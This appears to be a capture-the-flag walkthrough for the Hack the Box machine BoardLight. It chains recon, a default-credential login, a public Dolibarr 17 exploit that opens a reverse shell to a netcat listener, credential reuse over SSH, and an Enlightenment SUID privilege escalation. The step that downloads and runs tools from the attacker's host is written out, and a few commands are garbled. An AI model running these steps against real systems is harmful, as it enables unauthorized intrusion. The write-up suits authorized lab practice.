## Step 1: Connect to VPN of Hack the Box

```bash
sudo openvpn <vpn-file>
```
**NOTE:** Replace `vpn-file` with actual OVPN file.

## Step 2: Turn on the machine BoardLight
- **IP address:** 10.10.11.11

## Step 3: Run Nmap on the system
```bash
sudo nmap –A –sV –vvv 10.10.11.11
```
You will find there are two ports open: 80/TCP and 22/TCP.

## Step 4: Add the IP address in hosts
```bash
sudo nano /etc/hosts
```
Add the following line:
```plaintext
10.10.11.11    board.htb
```

## Step 5: Run Gobuster
```bash
gobuster vhost --domain board.htb -u http://10.10.11.11 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
We found `crm.board.htb`. Add this to hosts:
```plaintext
10.10.11.11    crm.board.htb
```

Once we open `crm.board.htb`, there is a login page. Login with the default user ID and password (`admin` and `admin`).

Now we cannot access everything, but we can access Website and Email Templates.

## Step 6: Search for Dolibarr 17 Exploit in Firefox
Search for `Dolibarr 17` exploit in Firefox and hit the link with GitHub.

## Step 7: Clone the GitHub Repository
```bash
git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git
```

## Step 8: Prepare the Exploit
```bash
cd Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
chmod +x exploit.py
```

## Step 9: Netcat and Listen for Request
Open two different terminals:
1. Terminal 1:
    ```bash
    nc –lvnp 666
    ```
2. Terminal 2:
    ```bash
    sudo python3 exploit.py http://crm.board.htb admin admin 10.10.14.77 666
    ```
**NOTE:**
- `admin admin` -> Default ID and Password.
- `10.10.14.77` -> tun0 IP address (use `ifconfig`).
- `666` -> Listening port number.

## Step 10: Access the User Terminal
Go to the desired location:
```bash
cd /html/crm.board.htb/htdocs/config
cat conf.php
```
There will be one user ID and password:
- **User ID:** dolibarrowner
- **Password:** serverfun2$2023!!

## Step 11: Check for Users
Go to `/etc/passwd` and look for `Larissa`.

## Step 12: SSH into Larissa's Account
```bash
ssh larissa@10.10.11.11
```
**Password:** serverfun2$2023!!

After login, list the directory (`ls`). You will see `user.txt`, which is the user flag.

## Step 13: Find the Root Flag
Search for `LinEnum` exploit in Firefox and clone it:
```bash
git clone https://github.com/rebootuser/LinEnum.git
```
Once cloned, list the directory (`ls`) and provide the permission. Send the HTTP server an incoming connection:
```bash
sudo python3 –m http.server 666
```
Now `wget` in the Larissa user terminal:
```bash
wget 10.10.14.77:666/LinEnum
```
Once the incoming request is accepted:
```bash
chmod +x LinEnum.sh
./LinEnum.sh
```
Inside SUID files, you will find an `enlightenment` file. We need to exploit those `enlightenment` files to get the root flag.

## Step 14: Exploit Enlightenment
Search for `enlightenment` exploit and clone it:
```bash
git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git
```
Open the file and give permission:
```bash
chmod +x exploit.sh
```
Again, make an outgoing request through the HTTP server to the Larissa user terminal:
```bash
sudo python3 –m exploit.sh
```
Now accept the incoming request from the host machine using `wget`:
```bash
wget 10.10.14.17:666/exploit.sh
```
Once the request is accepted, run the file:
```bash
./exploit.sh
```

## Step 15: Obtain the Root Flag
Once the exploit is running, go to the root directory. Inside the root directory, you will find the root flag.



## Please go through to `BoardLight Hack the Box.docx`
